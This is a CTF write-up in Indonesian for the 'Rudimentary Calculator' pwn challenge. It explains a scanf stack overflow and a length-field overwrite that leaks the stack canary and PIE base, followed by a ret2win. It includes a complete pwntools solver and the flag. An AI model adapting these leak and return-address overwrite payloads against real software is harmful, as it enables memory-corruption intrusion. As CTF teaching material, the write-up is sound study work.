# Rudimentary Calculator Writeup

## Challenge

**Category:** Pwn
**Challenge:** Rudimentary Calculator
**Flag:** `L3AK{s3Arch_f0r_Sm0otH}`

Challenge menyediakan service kalkulator sederhana yang hanya mendukung operasi perkalian antar digit. Pada source code terdapat fungsi `win()` yang membuka dan mencetak isi `flag.txt`, sehingga tujuan exploit adalah mengalihkan eksekusi program ke fungsi tersebut. Fungsi `win()` melakukan `fopen("flag.txt", "r")`, membaca flag dengan `fgets`, lalu mencetaknya menggunakan `printf`.

## Proteksi Binary

Hasil `checksec` menunjukkan binary memiliki beberapa proteksi aktif:

```text
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
SHSTK: Enabled
IBT: Enabled
```

Karena **PIE** aktif, alamat `win()` tidak bisa langsung dipakai sebagai alamat absolut. Karena **stack canary** aktif, overwrite return address juga tidak bisa dilakukan tanpa menjaga nilai canary tetap benar.

## Vulnerability

Program menyimpan input dan data perhitungan dalam sebuah struct lokal di stack:

```c
struct {
    char buf[0x1000];
    int product_bignum_len;
    uint32_t product_bignum[0x60];
} s;
```

Struct ini berada di fungsi `run()`. Program kemudian membaca input menggunakan:

```c
scanf("%s", s.buf);
```

Pemakaian `%s` tanpa batas panjang menyebabkan **stack overflow**, karena input bisa melewati `buf` dan menimpa field setelahnya, termasuk `product_bignum_len` dan `product_bignum`.

Selain itu, fungsi `multiply_digit()` juga tidak memvalidasi batas `product_bignum_len`. Jika terjadi carry, fungsi ini menulis ke:

```c
product_bignum[*product_bignum_len] = (uint32_t)carry;
(*product_bignum_len)++;
```

Tidak ada pengecekan apakah indeks masih berada di dalam `product_bignum[0x60]`. Ini membuka peluang out-of-bounds write pada stack.

Bug lain yang sangat penting ada pada fungsi `to_base_10()`. Fungsi ini melakukan:

```c
memcpy(tmp, product_bignum, product_bignum_len * sizeof(uint32_t));
```

Karena `product_bignum_len` dapat kita timpa lewat overflow `scanf`, kita bisa membuat fungsi ini membaca data stack melewati `product_bignum`, lalu mengubahnya menjadi angka desimal dan mencetaknya sebagai hasil kalkulasi.

## Exploit Strategy

Exploit dilakukan dalam dua tahap.

### Stage 1: Leak Canary dan PIE

Payload pertama menggunakan byte null setelah digit pertama:

```python
payload = b"1\x00"
```

Tujuannya adalah agar parser kalkulator melihat ekspresi hanya sebagai `1`, tetapi `scanf()` tetap menerima seluruh payload sampai whitespace. Payload kemudian dipanjangkan sampai menimpa `product_bignum_len`.

Dengan menimpa `product_bignum_len` menjadi nilai besar, `to_base_10()` akan membaca banyak limb dari stack dan mencetaknya sebagai angka desimal. Dari angka desimal ini, exploit mengubahnya kembali menjadi array 32-bit limb untuk mengambil:

```text
canary
saved rbp
saved rip
```

Dari `saved rip`, PIE base dihitung dengan:

```python
pie_base = saved_rip - RET_AFTER_RUN_OFF
win = pie_base + WIN_OFF
```

Offset yang digunakan:

```python
WIN_OFF = 0x1289
RET_AFTER_RUN_OFF = 0x1a9b
```

### Stage 2: Ret2win

Setelah canary dan PIE base diketahui, payload kedua dibuat untuk overwrite stack secara valid:

```text
padding sampai canary
+ canary asli
+ saved rbp
+ alamat win()
```

Payload ini tetap diawali dengan `1\x00` agar parser berhenti lebih awal dan tidak crash saat memproses isi overflow. Setelah payload kedua dikirim, exploit mengirim `quit` untuk keluar dari loop `run()`. Saat fungsi `run()` melakukan return, eksekusi berpindah ke `win()` dan flag tercetak.

## Solver

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "rudimentary-calculator.instances.ctf.l3ak.team"
PORT = 1337

context.log_level = "info"
context.arch = "amd64"

WIN_OFF = 0x1289
RET_AFTER_RUN_OFF = 0x1a9b

OFF_LEN = 0x1000
OFF_CANARY = 0x1188
LEAK_LIMBS = 103


def start():
    if args.LOCAL:
        return process("./chall")
    return remote(HOST, PORT, ssl=True)


def recv_prompt(p):
    return p.recvuntil(b"Enter an expression> ")


def limbs_from_decimal(s, count):
    n = int(s)
    limbs = []
    for _ in range(count):
        limbs.append(n & 0xffffffff)
        n >>= 32
    return limbs


def leak_payload():
    payload = b"1\x00"
    payload = payload.ljust(OFF_LEN, b"A")
    payload += p32(LEAK_LIMBS)
    return payload


def exploit_payload(canary, saved_rbp, win):
    payload = b"1\x00"
    payload = payload.ljust(OFF_LEN, b"A")

    payload += p32(1)
    payload += p32(1)

    payload = payload.ljust(OFF_CANARY, b"B")
    payload += p64(canary)
    payload += p64(saved_rbp)
    payload += p64(win)
    return payload


p = start()

recv_prompt(p)

p.sendline(leak_payload())
data = p.recvuntil(b"Enter an expression> ")

m = re.search(rb"Result: ([0-9]+)", data)
if not m:
    log.failure("Leak failed")
    print(data.decode(errors="ignore"))
    exit(1)

limbs = limbs_from_decimal(m.group(1), LEAK_LIMBS)

canary = (limbs[98] << 32) | limbs[97]
saved_rbp = (limbs[100] << 32) | limbs[99]
saved_rip = (limbs[102] << 32) | limbs[101]

pie_base = saved_rip - RET_AFTER_RUN_OFF
win = pie_base + WIN_OFF

log.success(f"canary    = {canary:#x}")
log.success(f"saved_rbp = {saved_rbp:#x}")
log.success(f"saved_rip = {saved_rip:#x}")
log.success(f"pie_base  = {pie_base:#x}")
log.success(f"win       = {win:#x}")

p.sendline(exploit_payload(canary, saved_rbp, win))
p.recvuntil(b"Enter an expression> ")
p.sendline(b"quit")

p.interactive()
```

## Flag

```text
L3AK{s3Arch_f0r_Sm0otH}
```
